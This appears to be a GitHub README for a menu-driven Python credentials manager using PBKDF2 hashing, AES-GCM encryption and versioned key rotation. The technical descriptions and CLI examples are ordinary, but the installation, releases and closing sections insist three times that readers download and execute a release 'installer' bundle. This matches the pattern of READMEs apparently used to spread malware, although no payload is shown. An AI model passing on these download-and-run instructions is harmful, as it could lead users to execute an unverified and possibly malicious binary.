[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/monirbd167/User-Credentials-Manager/releases)

# Secure User Credentials Manager: Hashing, Encryption, Rotation

🔐 A menu-driven Python app to store, manage, and protect user credentials. It hashes passwords, encrypts secrets, rotates keys on schedule, and saves everything to files. Ideal for small teams, scripts, or local safe storage.

![credentials-lock](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?ixlib=rb-4.0.3&w=1200&q=80)

Table of Contents
- About
- Key features
- Security model
- File layout
- Installation
- Quick start
- Command menu
- CLI examples
- Key rotation policy
- Data format
- Backup and recovery
- Tests
- Contributing
- License
- Releases

About
- This tool runs from a terminal. It uses proven crypto building blocks.
- It stores user records in JSON files.
- It separates password hashing from secret encryption.
- It supports add, update, delete, list, export, and import.

Key features
- Password hashing: PBKDF2-HMAC-SHA256 with salt and configurable iterations.
- Encryption: AES-GCM for authenticated encryption of secrets.
- Key management: File-based keys with scheduled rotation.
- Menu-driven UI: Terminal menu for common tasks.
- File persistence: Credentials and keys stored as JSON and binary files.
- Audit metadata: Timestamps and key version tags.
- Error handling: Clear messages and non-destructive operations.
- Safe defaults: Strong salts, IVs, and random keys.

Security model
- Hash passwords with PBKDF2-HMAC-SHA256 and per-user salt.
- Store only password hashes and salts. Do not store plaintext passwords.
- Encrypt sensitive fields (notes, tokens) with AES-GCM.
- Derive encryption key from a master key file. Rotate the master key periodically.
- Use authentication tags to detect tampering.
- Limit file permissions: set files to user-only read/write (chmod 600).
- Keep offline backups of key files in a secure place.

File layout
- data/
  - credentials.json      # stores user records (hash, salt, meta, encrypted fields)
  - keys/
    - key_v1.bin          # binary master key
    - key_v2.bin
  - backups/
    - credentials.json.YYYYMMDD
- scripts/
  - rotate_keys.py
  - migrate_keys.py
- docs/
  - design.md

Installation

1) Download the release package from Releases and execute the installer file:
- Visit the Releases page: https://github.com/monirbd167/User-Credentials-Manager/releases
- Download the release bundle for your platform and run the included script or installer. The release file must be downloaded and executed.

2) Typical manual install (when using source)
- Clone the repo:
```
git clone https://github.com/monirbd167/User-Credentials-Manager.git
cd User-Credentials-Manager
```
- Create and activate a Python venv:
```
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```
- Initialize storage:
```
python3 manage.py init
```

Quick start
- Initialize storage and keys:
```
python3 manage.py init
```
- Create an admin user:
```
python3 manage.py add --user admin --password
```
The command prompts for a password and optional fields.

- List users:
```
python3 manage.py list
```

Command menu (menu-driven mode)
- Start interactive menu:
```
python3 manage.py menu
```
Menu options:
1. Add user
2. Update user
3. Delete user
4. Show user
5. Change user password
6. Export credentials
7. Import credentials
8. Rotate keys
9. Backup data
0. Exit

Add user flow
- The app asks for username and password.
- It generates a random salt.
- It hashes the password with PBKDF2-HMAC-SHA256.
- It stores the hash and salt in credentials.json.
- You can add an encrypted note or token. The app encrypts it with the current master key.

Password hashing specifics
- KDF: PBKDF2-HMAC-SHA256
- Salt length: 16 bytes (128 bits)
- Iterations: configurable, default 200000
- Hash output: 32 bytes (256 bits)
- Stored fields: {kdf, salt, iterations, hash}

Encryption specifics
- Cipher: AES-256-GCM
- Key length: 32 bytes
- IV/nonce: 12 bytes random per-encryption
- Auth tag: stored with ciphertext
- Stored encrypted field: base64(iv || ciphertext || tag) with key version tag

Key rotation policy
- Keys are versioned (key_v1, key_v2).
- When rotating:
  - Generate new key file key_vN.bin.
  - Re-encrypt secrets with new key or mark records to lazy-rotate on next update.
  - Update a global pointer to the active key version.
- The repo provides a script:
```
python3 scripts/rotate_keys.py --generate --rekey-all
```
- Use scheduled cronjobs for periodic rotations:
  - Example: rotate every 90 days.
  - Keep old keys for at least 30 days for decryption and rollback.

Releases and downloads
- Download the release bundle and execute the included installer script. See Releases:
[![Release Download](https://img.shields.io/badge/Download%20Release-%20Latest-brightgreen?logo=github&style=for-the-badge)](https://github.com/monirbd167/User-Credentials-Manager/releases)

Data format (credentials.json)
- File is a JSON array of records.
- Example record:
```
{
  "username": "alice",
  "kdf": "pbkdf2_hmac_sha256",
  "hash": "base64-encoded-hash",
  "salt": "base64-encoded-salt",
  "iterations": 200000,
  "encrypted_note": {
    "key_version": "v2",
    "data": "base64(iv||ciphertext||tag)"
  },
  "created_at": "2024-05-01T12:00:00Z",
  "updated_at": "2024-06-01T09:30:00Z"
}
```

Export and import
- Export to an encrypted archive:
```
python3 manage.py export --out backup.enc --passphrase
```
- Import:
```
python3 manage.py import --in backup.enc --passphrase
```
- The export file encrypts the full JSON using a passphrase-derived key (PBKDF2 + AES-GCM).

Backup and recovery
- The app can auto-backup before key rotation and before batch operations.
- Backups copy credentials.json to data/backups/ with ISO date suffix.
- Store key files and backups separately and restrict access.
- Recovery:
  - Restore credentials.json from backup.
  - Ensure matching key_v*.bin files exist.
  - If the key moved, run migrate_keys.py to map old key version tags to current keys.

CLI examples
- Add user with note:
```
python3 manage.py add --user bob --password --note "Service API key"
```
- Change password:
```
python3 manage.py passwd --user bob
```
- Re-encrypt all secrets with new key:
```
python3 scripts/rotate_keys.py --rekey-all --new-version v3
```
- Search users:
```
python3 manage.py search --query "bob"
```

Testing
- Run unit tests:
```
pytest tests/
```
- Tests cover:
  - KDF behavior
  - AES-GCM encryption/decryption
  - Key rotation and version handling
  - File read/write and backup logic
  - CLI commands and menu flows

Operational notes
- Run on a trusted machine only.
- Restrict access to data/ and keys/ to the OS user account.
- Store keys in a secure vault for automated deployments where possible.
- Check file permissions after install:
```
ls -al data keys
chmod 600 data/credentials.json keys/key_*.bin
```

Troubleshooting
- If decryption fails after rotation:
  - Confirm key files for older versions exist in data/keys.
  - Run migrate script:
    ```
    python3 scripts/migrate_keys.py --recover
    ```
- If import fails:
  - Check passphrase and KDF parameters.
  - Validate the export signature with:
    ```
    python3 manage.py verify-export backup.enc
    ```

Design notes (docs/design.md)
- Separate auth from encryption.
- Use per-user salts to resist rainbow tables.
- Use AEAD cipher for confidentiality and integrity.
- File-based keys allow simple backup and rotation without external KMS.
- Provide scripts so admins can automate rotation and backup.

Contributing
- Read CONTRIBUTING.md in the repo.
- Open issues for bugs or feature requests.
- Send PRs with tests and clear commit messages.
- Keep code simple and readable.

Maintainers
- Maintained by the repository owner. For issues, open an issue on GitHub.

License
- MIT License. See LICENSE file for details.

Releases
- Download and run the release file from the Releases page. The release file must be downloaded and executed from:
https://github.com/monirbd167/User-Credentials-Manager/releases

Badges
[![Python](https://img.shields.io/badge/Python-3.8%2B-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

Screenshots
![menu-example](https://raw.githubusercontent.com/github/explore/main/topics/command-line/command-line.png)
![encryption](https://images.unsplash.com/photo-1555066931-4365d14bab8c?ixlib=rb-4.0.3&w=1200&q=80)